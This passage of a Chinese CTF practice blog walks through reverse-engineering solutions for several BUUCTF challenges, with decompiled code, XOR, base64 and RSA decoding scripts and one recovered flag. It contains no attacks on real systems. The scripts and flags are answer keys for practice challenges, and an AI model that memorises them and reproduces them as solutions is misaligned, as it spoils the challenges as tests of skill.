v18[<span class="number">39</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( sub_424BA0(v18) == <span class="number">39</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = sub_400E44(v18);</span><br><span class="line">      v3 = sub_400E44(v2);</span><br><span class="line">      v4 = sub_400E44(v3);</span><br><span class="line">      v5 = sub_400E44(v4);</span><br><span class="line">      v6 = sub_400E44(v5);</span><br><span class="line">      v7 = sub_400E44(v6);</span><br><span class="line">      v8 = sub_400E44(v7);</span><br><span class="line">      v9 = sub_400E44(v8);</span><br><span class="line">      v10 = sub_400E44(v9);</span><br><span class="line">      v11 = sub_400E44(v10);</span><br><span class="line">      <span class="keyword">if</span> ( !(<span class="keyword">unsigned</span> <span class="keyword">int</span>)sub_400360(v11, off_6CC090) )</span><br><span class="line">      &#123;</span><br><span class="line">        sub_410CC0(<span class="string">&quot;You found me!!!&quot;</span>);</span><br><span class="line">        sub_410CC0(<span class="string">&quot;bye bye~&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      result = <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      result = <span class="number">4294967293LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_13:</span><br><span class="line">  <span class="keyword">if</span> ( __readfsqword(<span class="number">0x28</span>u) != v19 )</span><br><span class="line">    sub_444020();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可见前面这几个对v12,v13,v14,都进行了一系列初始化操作</p>
<p>v12初始化成Iodl&gt;Qnb(ocy</p>
<p>v13初始化成y.i</p>
<p>v14初始化成d`3w}wek9{iy=~yL@EC</p>
<p>v15可能是flag，长度是36</p>
<p>暂时不知道sub_4406E0(0LL, v15, 37LL);这个是干嘛的，可能是flag的输入</p>
<p>接着往下分析可以看出来，后面还有一段flag，是39位的，先进行第一段的解密吧</p>
<p>这里是判断v15异或是否满足v12的条件，但是v12的长度肯定是不够的，所以猜测应该是v12+v13+v14，这样刚好就是36位</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230430182031152.png" alt="image-20230430182031152"></p>
<p>记得要让第十二和第十六位是127</p>
<p>a={73,111,100,108,62,81,110,98,40,111,99,121,127，121,46,105,127，100,96,51,119,125,119,101,107,57,123,105,121,61,126,121,76,64,69,67,}</p>
<p>脚本如下：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> a[] = &#123; <span class="number">73</span>,<span class="number">111</span>,<span class="number">100</span>,<span class="number">108</span>,<span class="number">62</span>,<span class="number">81</span>,<span class="number">110</span>,<span class="number">98</span>,<span class="number">40</span>,<span class="number">111</span>,<span class="number">99</span>,<span class="number">121</span>,<span class="number">127</span>,<span class="number">121</span>,<span class="number">46</span>,<span class="number">105</span>,<span class="number">127</span>,<span class="number">100</span>,<span class="number">96</span>,<span class="number">51</span>,<span class="number">119</span>,<span class="number">125</span>,<span class="number">119</span>,<span class="number">101</span>,<span class="number">107</span>,<span class="number">57</span>,<span class="number">123</span>,<span class="number">105</span>,<span class="number">121</span>,<span class="number">61</span>,<span class="number">126</span>,<span class="number">121</span>,<span class="number">76</span>,<span class="number">64</span>,<span class="number">69</span>,<span class="number">67</span>, &#125;;</span><br><span class="line">	<span class="keyword">char</span> v5[<span class="number">36</span>];</span><br><span class="line">	<span class="built_in">memset</span>(v5, <span class="string">&#x27;\0&#x27;</span>, <span class="number">36</span>);</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">36</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		v5[i] = i ^ a[i];</span><br><span class="line">		cout &lt;&lt; v5[i];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>结果是这样的：</p>
<p>Info:The first four chars are <code>flag</code></p>
<p>下面是对第二个信息v18进行加密，长度是39，sub_400E44，点进这个函数，是base64加密，并且进行了10次</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230430184238399.png" alt="image-20230430184238399"></p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230430184742600.png" alt="image-20230430184742600"></p>
<p>顺便在此放上一个b站up主讲的base64编码，讲得非常耐斯</p>
<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1Wt4y1q7dH/?spm_id_from=333.337.search-card.all.click&vd_source=58cfa1baa3e6de379d24af76b6fbcb54">原理到实现 | 一个视频完全掌握base64编码_哔哩哔哩_bilibili</a></p>
<p>与&amp;运算：比如与3进行与运算，那么3位置上的数他还有，其他全部清零</p>
<p>加密后的结果是off_6CC090，查看他的值，就是我们刚进来时看到的一大长串变量字符串</p>
<p>脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">a = <span class="string">&#x27;Vm0wd2VHUXhTWGhpUm1SWVYwZDRWVll3Wkc5WFJsbDNXa1pPVlUxV2NIcFhhMk0xVmpKS1NHVkdXbFpOYmtKVVZtcEtTMUl5VGtsaVJtUk9ZV3hhZVZadGVHdFRNVTVYVW01T2FGSnRVbGhhVjNoaFZWWmtWMXBFVWxSTmJFcElWbTAxVDJGV1NuTlhia0pXWWxob1dGUnJXbXRXTVZaeVdrWm9hVlpyV1hwV1IzaGhXVmRHVjFOdVVsWmlhMHBZV1ZSR1lWZEdVbFZTYlhSWFRWWndNRlZ0TVc5VWJGcFZWbXR3VjJKSFVYZFdha1pXWlZaT2NtRkhhRk5pVjJoWVYxZDBhMVV3TlhOalJscFlZbGhTY1ZsclduZGxiR1J5VmxSR1ZXSlZjRWhaTUZKaFZqSktWVkZZYUZkV1JWcFlWV3BHYTFkWFRrZFRiV3hvVFVoQ1dsWXhaRFJpTWtsM1RVaG9hbEpYYUhOVmJUVkRZekZhY1ZKcmRGTk5Wa3A2VjJ0U1ExWlhTbFpqUldoYVRVWndkbFpxUmtwbGJVWklZVVprYUdFeGNHOVhXSEJIWkRGS2RGSnJhR2hTYXpWdlZGVm9RMlJzV25STldHUlZUVlpXTlZadE5VOVdiVXBJVld4c1dtSllUWGhXTUZwell6RmFkRkpzVWxOaVNFSktWa1phVTFFeFduUlRhMlJxVWxad1YxWnRlRXRXTVZaSFVsUnNVVlZVTURrPQ==&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    a = base64.b64decode(a).decode(<span class="string">&quot;utf-8&quot;</span>) <span class="comment">#必须先转码成byte型，因为python3中字符都为unicode编码，但是b64encode函数的参数为byte类型</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure>

<p>结果为：</p>
<p><a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-254172.htm">https://bbs.pediy.com/thread-254172.htm</a></p>
<p>是个网页。。。什么东西，再回头看看代码</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230430190527451.png" alt="image-20230430190527451"></p>
<p>这个下面还有参数，看看哪里调用了</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230430190609098.png" alt="image-20230430190609098"></p>
<p>最后来到这</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">sub_400D35</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-24h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// [rsp+14h] [rbp-1Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// [rsp+24h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v1 = sub_43FD20(<span class="number">0LL</span>) - qword_6CEE38;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">1233</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_40F790(v1);</span><br><span class="line">    sub_40FE60();</span><br><span class="line">    sub_40FE60();</span><br><span class="line">    v1 = sub_40FE60() ^ <span class="number">0x98765432</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v4 = v1;</span><br><span class="line">  <span class="keyword">if</span> ( (v1 ^ byte_6CC0A0[<span class="number">0</span>]) == <span class="number">102</span> &amp;&amp; (HIBYTE(v4) ^ byte_6CC0A3) == <span class="number">103</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">24</span>; ++j )</span><br><span class="line">      sub_410E90((byte_6CC0A0[j] ^ *(&amp;v4 + j % <span class="number">4</span>)));</span><br><span class="line">  &#125;</span><br><span class="line">  result = __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">    sub_444020();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看到别人的解答说这个函数调用时在fini段，也就是程序结束的地方调用的</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230430191955996.png" alt="image-20230430191955996"></p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230430193324182.png" alt="image-20230430193324182"></p>
<p>这里可以看到v1是4个字节</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230603002634834.png" alt="image-20230603002634834"></p>
<p>这里的这两个参数是连在一块的，是我们在base64编码参数后面看到的那个参数</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230603002713530.png" alt="image-20230603002713530"></p>
<p>应该是v1与这一段异或等于flag，因为v1是unsigned int 4个字节，刚好是四个字母，v4又等于v1，所以就是v1与跟这段字符串异或，脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">v1=[<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;g&#x27;</span>]</span><br><span class="line">data=[<span class="number">0x40</span>, <span class="number">0x35</span>, <span class="number">0x20</span>, <span class="number">0x56</span>, <span class="number">0x5D</span>, <span class="number">0x18</span>, <span class="number">0x22</span>, <span class="number">0x45</span>, <span class="number">0x17</span>, <span class="number">0x2F</span>, <span class="number">0x24</span>, </span><br><span class="line"><span class="number">0x6E</span>, <span class="number">0x62</span>, <span class="number">0x3C</span>, <span class="number">0x27</span>, <span class="number">0x54</span>, <span class="number">0x48</span>, <span class="number">0x6C</span>, <span class="number">0x24</span>, <span class="number">0x6E</span>, <span class="number">0x72</span>, <span class="number">0x3C</span>, <span class="number">0x32</span>, <span class="number">0x45</span>, <span class="number">0x5B</span>]</span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line">v4=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    v4.append(<span class="built_in">ord</span>(v1[i])^data[i])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">    flag+=<span class="built_in">chr</span>(data[i]^v4[i%<span class="number">4</span>])</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<h1 id="13-MRCTF2020-Transform1"><a href="#13-MRCTF2020-Transform1" class="headerlink" title="13.[MRCTF2020]Transform1"></a>13.[MRCTF2020]Transform1</h1><p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230605234640914.png" alt="image-20230605234640914"></p>
<p>进入主函数</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230606004626653.png" alt="image-20230606004626653"></p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230606004641658.png" alt="image-20230606004641658"></p>
<p>很简单的异或逻辑</p>
<p>脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">a =[<span class="number">0x67</span>, <span class="number">0x79</span>, <span class="number">0x7B</span>, <span class="number">0x7F</span>, <span class="number">0x75</span>, <span class="number">0x2B</span>, <span class="number">0x3C</span>, <span class="number">0x52</span>, <span class="number">0x53</span>, <span class="number">0x79</span>, <span class="number">0x57</span>, <span class="number">0x5E</span>, <span class="number">0x5D</span>, <span class="number">0x42</span>, <span class="number">0x7B</span>, <span class="number">0x2D</span>, <span class="number">0x2A</span>, <span class="number">0x66</span>, <span class="number">0x42</span>, <span class="number">0x7E</span>, <span class="number">0x4C</span>, <span class="number">0x57</span>, <span class="number">0x79</span>, <span class="number">0x41</span>, <span class="number">0x6B</span>, <span class="number">0x7E</span>, <span class="number">0x65</span>, <span class="number">0x3C</span>, <span class="number">0x5C</span>, <span class="number">0x45</span>, <span class="number">0x6F</span>, <span class="number">0x62</span>, <span class="number">0x4D</span>]</span><br><span class="line">b=[<span class="number">0x9</span>, <span class="number">0x0A</span>, <span class="number">0x0F</span>, <span class="number">0x17</span>, <span class="number">0x7</span>, <span class="number">0x18</span>, <span class="number">0x0C</span>, <span class="number">0x6</span>, <span class="number">0x1</span>, <span class="number">0x10</span>, <span class="number">0x3</span>, <span class="number">0x11</span>, <span class="number">0x20</span>, <span class="number">0x1D</span>, <span class="number">0x0B</span>, <span class="number">0x1E</span>, <span class="number">0x1B</span>, <span class="number">0x16</span>, <span class="number">0x4</span>, <span class="number">0x0D</span>, <span class="number">0x13</span>, <span class="number">0x14</span>, <span class="number">0x15</span>, <span class="number">0x2</span>, <span class="number">0x19</span>, <span class="number">0x5</span>, <span class="number">0x1F</span>, <span class="number">0x8</span>, <span class="number">0x12</span>, <span class="number">0x1A</span>, <span class="number">0x1C</span>, <span class="number">0x0E</span>, <span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">c=[<span class="number">0</span>]*<span class="number">33</span></span><br><span class="line">flag=[<span class="number">0</span>]*<span class="number">33</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(b)):</span><br><span class="line">    c[i] = a[i]^b[i]</span><br><span class="line">j=<span class="number">0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> b:</span><br><span class="line">    flag[i]=c[j]</span><br><span class="line">    j+=<span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> flag]))</span><br></pre></td></tr></table></figure>

<h1 id="14-WUSTCTF2020-level21"><a href="#14-WUSTCTF2020-level21" class="headerlink" title="14.[WUSTCTF2020]level21"></a>14.[WUSTCTF2020]level21</h1><p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230606004826990.png" alt="image-20230606004826990"></p>
<p>upx壳，脱壳后拖入ida</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230606155425627.png" alt="image-20230606155425627"></p>
<p>直接得到flag</p>
<h1 id="15-SUCTF2019-SignIn1"><a href="#15-SUCTF2019-SignIn1" class="headerlink" title="15.[SUCTF2019]SignIn1"></a>15.[SUCTF2019]SignIn1</h1><p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230606155603758.png" alt="image-20230606155603758"></p>
<p>拖入ida</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230606155745685.png" alt="image-20230606155745685"></p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230606155748650.png" alt="image-20230606155748650"></p>
<p>v8就是我们输入的flag，进入sub_96A函数看看</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230606155910125-16860383510861.png" alt="image-20230606155910125"></p>
<p>看样子是个求字符串长度的函数，然后把v8赋值给了v9</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230606160321415.png" alt="image-20230606160321415"></p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230606160311918.png" alt="image-20230606160311918"></p>
<p>这几个函数都在got表中，动态链接库里才有完成代码</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230606160404725.png" alt="image-20230606160404725"></p>
<p>字符串信息中刚好有一个libc.so.6，应该就是链接的文件名，把这个拖进ida看看</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230606160613286.png" alt="image-20230606160613286"></p>
<p>没有搜到相关的函数。。。</p>
<p>直接百度这个函数，结果如下</p>
<p><code>__gmpz_init_set_str()</code> 是一个函数，通常在 GNU MP (GMP) 库中使用。GMP 是一个用于高精度整数和有理数运算的开源数学库。</p>
<p><code>__gmpz_init_set_str()</code> 函数用于初始化一个 GMP 整数类型 <code>mpz_t</code> 并将其设置为给定的字符串表示的整数值。它的函数原型如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cCopy code</span><br><span class="line">void __gmpz_init_set_str(mpz_t rop, const char *str, int base)</span><br></pre></td></tr></table></figure>

<p>参数说明：</p>
<ul>
<li><code>rop</code>：<code>mpz_t</code> 类型的指针，表示要进行初始化和设置的目标整数。</li>
<li><code>str</code>：要设置的整数的字符串表示。</li>
<li><code>base</code>：字符串中的进制基数，例如，如果字符串表示十进制数，则将 <code>base</code> 设置为 10。</li>
</ul>
<p>该函数将字符串表示的整数值设置到目标整数 <code>rop</code> 中，并进行适当的初始化。在使用完整数之后，应使用 <code>__gmpz_clear()</code> 函数清除相应的内存。</p>
<p>需要注意的是，前缀 <code>__</code> 表示这是一个内部函数，而不是公共接口。在实际使用中，建议使用公共接口 <code>mpz_init_set_str()</code> 来代替 <code>__gmpz_init_set_str()</code>。</p>
<p>还有这个函数</p>
<img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230606161117266.png" alt="image-20230606161117266" style="zoom:33%;">

<p><code>__gmpz_powm()</code> 是 GMP（GNU MP）库中的一个函数，用于计算模幂运算。</p>
<p>该函数用于计算给定的基数 <code>g</code> 的整数幂对给定的模数 <code>m</code> 取模的结果。函数原型如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cCopy code</span><br><span class="line">void __gmpz_powm(mpz_t rop, const mpz_t base, const mpz_t exp, const mpz_t mod)</span><br></pre></td></tr></table></figure>

<p>参数说明：</p>
<ul>
<li><code>rop</code>：<code>mpz_t</code> 类型的指针，表示计算结果的目标整数。</li>
<li><code>base</code>：<code>mpz_t</code> 类型的整数，表示要进行幂运算的基数。</li>
<li><code>exp</code>：<code>mpz_t</code> 类型的整数，表示幂运算的指数。</li>
<li><code>mod</code>：<code>mpz_t</code> 类型的整数，表示模数。</li>
</ul>
<p>函数将计算结果存储在目标整数 <code>rop</code> 中。在使用前，应先使用 <code>__gmpz_init()</code> 或 <code>__gmpz_init2()</code> 初始化目标整数，使用完毕后，应使用 <code>__gmpz_clear()</code> 清除相应的内存。</p>
<p>那么加密流程是将输入的flag设置成16进制数然后进行幂运算再取模，即flag的x次方mod y等于最后的结果，这个跟RSA加密很像，flag=v6，x=v5，y=v4</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230606175710628.png" alt="image-20230606175710628"></p>
<p>结果是v7</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230606175908454.png" alt="image-20230606175908454"></p>
<p>那么直接RSA解密就行，python内置的RSA库函数有这些</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__all__ = [<span class="string">&quot;newkeys&quot;</span>, <span class="string">&quot;encrypt&quot;</span>, <span class="string">&quot;decrypt&quot;</span>, <span class="string">&quot;sign&quot;</span>, <span class="string">&quot;verify&quot;</span>, <span class="string">&#x27;PublicKey&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;PrivateKey&#x27;</span>, <span class="string">&#x27;DecryptionError&#x27;</span>, <span class="string">&#x27;VerificationError&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;compute_hash&#x27;</span>, <span class="string">&#x27;sign_hash&#x27;</span>]</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>先分解n</p>
<p><a target="_blank" rel="noopener" href="http://www.factordb.com/">factordb.com</a></p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230606182040359.png" alt="image-20230606182040359"></p>
<p>p=282164587459512124844245113950593348271</p>
<p>q=366669102002966856876605669837014229419</p>
<p>脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">p = <span class="number">282164587459512124844245113950593348271</span></span><br><span class="line">q = <span class="number">366669102002966856876605669837014229419</span></span><br><span class="line">c = <span class="number">0xad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35</span></span><br><span class="line">n = <span class="number">103461035900816914121390101299049044413950405173712170434161686539878160984549</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">d = gmpy2.invert(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))<span class="comment">#求d (e * d) % ((p-1)*(q-1)) == 1</span></span><br><span class="line">m = gmpy2.powmod(c, d, n)<span class="comment">#解密 (c^d) % n</span></span><br><span class="line"><span class="built_in">print</span>(binascii.unhexlify(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]).decode(encoding=<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">这行代码的作用是将解密后的整数 m 转换为十六进制字符串，然后使用 binascii.unhexlify() 函数将其解码为字节串，最后使用指定的编码方式进行解码，得到明文的字符串表示。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">具体而言，hex(m) 将整数 m 转换为十六进制字符串表示，例如 &#x27;0x123&#x27;。通过切片操作 [2:]，我们去掉了字符串开头的 &#x27;0x&#x27;，只保留了实际的十六进制数部分，例如 &#x27;123&#x27;。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">然后，binascii.unhexlify() 函数将十六进制字符串转换为字节串，例如 b&#x27;\x12\x34&#x27;。这个函数将每两个十六进制字符解析为一个字节。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">最后，.decode(encoding=&quot;utf-8&quot;) 使用 UTF-8 编码方式对字节串进行解码，将其转换为明文的字符串表示。</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>suctf{Pwn_@_hundred_years}</p>
<h1 id="16-ACTF新生赛2020-usualCrypt1"><a href="#16-ACTF新生赛2020-usualCrypt1" class="headerlink" title="16.[ACTF新生赛2020]usualCrypt1"></a>16.[ACTF新生赛2020]usualCrypt1</h1><p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230606225239156.png" alt="image-20230606225239156"></p>
<p>打开ida</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230606230311157.png" alt="image-20230606230311157"></p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230606225849184.png" alt="image-20230606225849184"></p>
<p>跟进加密函数</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230606230326168.png" alt="image-20230606230326168"></p>
<p>base64</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230606231631428.png" alt="image-20230606231631428"></p>
<p>跟进</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230606231649336.png" alt="image-20230606231649336"></p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230606231704631.png" alt="image-20230606231704631"></p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230606231918499.png" alt="image-20230606231918499"></p>
<p>看样子是将byte_40E0AA的第七位到第十四位换成了byte_40E0A0，回到base64的加密函数</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230606232315796.png" alt="image-20230606232315796"></p>
<p>最后有一个这个函数，跟进看看</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230606232337657.png" alt="image-20230606232337657"></p>
<p>值得一提的是，这里的v1=0i64是将v1初始化为0，这是__int 64的一种特殊写法</p>
<p>这里就是一个单纯的大小写转换</p>
